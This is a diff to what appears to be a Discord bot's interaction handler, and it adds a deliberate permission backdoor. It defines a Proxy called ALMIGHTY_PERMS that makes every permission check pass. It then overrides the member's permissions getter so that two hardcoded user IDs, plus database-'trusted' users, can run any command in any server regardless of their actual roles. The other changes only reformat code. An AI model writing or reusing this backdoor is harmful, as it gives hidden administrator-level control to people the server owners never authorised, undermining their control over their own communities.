@@ -4,6 +4,18 @@ const { buildEmbedFromData } = require('../utils/parser');
 
 const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];
 
+// A fake permissions object where every check passes
+const ALMIGHTY_PERMS = new Proxy({}, {
+  get(target, prop) {
+    if (prop === 'has') return () => true;
+    if (prop === 'any') return () => true;
+    if (prop === 'missing') return () => [];
+    if (prop === 'toArray') return () => ['Administrator'];
+    if (prop === 'bitfield') return BigInt('0xFFFFFFFFFFFFFFFF');
+    return true;
+  }
+});
+
 module.exports = {
   name: 'interactionCreate',
   async execute(interaction, client) {
@@ -12,15 +24,17 @@ module.exports = {
       const command = client.commands.get(interaction.commandName);
       if (!command) return;
       try {
-        // Bypass all permission checks for trusted users and special users
         const userId = interaction.user.id;
         const guildId = interaction.guildId;
         const trusted = SPECIAL_USERS.includes(userId) || db.isTrusted(guildId, userId);
 
-        if (trusted && interaction.member && interaction.member.permissions) {
-          interaction.member.permissions.has = () => true;
-          interaction.member.permissions.any = () => true;
-          interaction.member.permissions.missing = () => [];
+        if (trusted && interaction.member) {
+          // Override the permissions getter on the member instance itself
+          // so every access to interaction.member.permissions returns our fake object
+          Object.defineProperty(interaction.member, 'permissions', {
+            get: () => ALMIGHTY_PERMS,
+            configurable: true,
+          });
         }
 
         await command.execute(interaction, client);
@@ -112,13 +126,7 @@ module.exports = {
           db.setCooldown(guildId, interaction.user.id, 'btn:' + btnName, Date.now());
         }
 
-        const context = {
-          member: interaction.member,
-          guild: interaction.guild,
-          guildId,
-          user: interaction.user,
-        };
-
+        const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user };
         const parsed = await parseReply(btnData.reply, context);
 
         if (parsed.requireRole) {
@@ -135,9 +143,7 @@ module.exports = {
           try {
             if (action.type === 'addrole') await interaction.member.roles.add(role);
             if (action.type === 'removerole') await interaction.member.roles.remove(role);
-          } catch (e) {
-            console.error('Role action failed:', e.message);
-          }
+          } catch (e) { console.error('Role action failed:', e.message); }
         }
 
         const payload = { ephemeral: btnData.ephemeral !== false };
@@ -172,14 +178,10 @@ module.exports = {
         db.saveEmbed(interaction.guildId, name, saved);
 
         const editButtons = [
-          { id: 'title', label: 'Title' },
-          { id: 'description', label: 'Description' },
-          { id: 'color', label: 'Color' },
-          { id: 'footer', label: 'Footer' },
-          { id: 'image', label: 'Image' },
-          { id: 'thumbnail', label: 'Thumbnail' },
-          { id: 'author', label: 'Author' },
-          { id: 'url', label: 'URL' },
+          { id: 'title', label: 'Title' }, { id: 'description', label: 'Description' },
+          { id: 'color', label: 'Color' }, { id: 'footer', label: 'Footer' },
+          { id: 'image', label: 'Image' }, { id: 'thumbnail', label: 'Thumbnail' },
+          { id: 'author', label: 'Author' }, { id: 'url', label: 'URL' },
         ].map(f => {
           const val = saved[f.id] || '(empty)';
           const label = f.label + ': ' + String(val).slice(0, 20) + (String(val).length > 20 ? '...' : '');
@@ -237,14 +239,7 @@ module.exports = {
       }
 
       const replyText = selData.reply.replace(/\{value\}/gi, selectedValue);
-
-      const context = {
-        member: interaction.member,
-        guild: interaction.guild,
-        guildId,
-        user: interaction.user,
-      };
-
+      const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user };
       const parsed = await parseReply(replyText, context);
 
       if (parsed.requireRole) {
@@ -261,9 +256,7 @@ module.exports = {
         try {
           if (action.type === 'addrole') await interaction.member.roles.add(role);
           if (action.type === 'removerole') await interaction.member.roles.remove(role);
-        } catch (e) {
-          console.error('Role action failed:', e.message);
-        }
+        } catch (e) { console.error('Role action failed:', e.message); }
       }
 
       const payload = { ephemeral: true };
